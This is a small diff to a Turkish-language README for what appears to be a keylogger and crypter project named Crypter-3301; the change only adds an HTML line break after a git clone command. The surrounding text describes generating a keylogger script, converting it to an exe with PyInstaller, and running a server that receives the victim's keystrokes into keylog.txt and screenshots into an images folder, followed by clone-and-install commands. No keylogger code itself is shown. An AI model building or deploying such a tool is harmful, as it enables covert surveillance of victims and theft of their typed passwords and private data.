@@ -9,7 +9,7 @@ keylog.txt(Sunucuya gelen tuşlar bu dosyaya kaydedilir) ve images klasörü(SS 
 Sonra program sizde oluşturulan keylogger.py dosyasının yolunu ister. Yoldoğu girilince python dosyasını exe ye çevirir(PyInstaller ile).
 Exe başarılı bir şekilde oluşturulursa server.py çalıştırılır ve oluşturulan exe'nin açılması beklenir. Bazı ufak hatalar olabilir(Ufak hataları düzelteceğiz).
 
-git clone https://github.com/zer0crypt02/Crypter-3301
+git clone https://github.com/zer0crypt02/Crypter-3301<br>
 cd Crypter-3301
 pip3 install -r requirements.txt
 python3
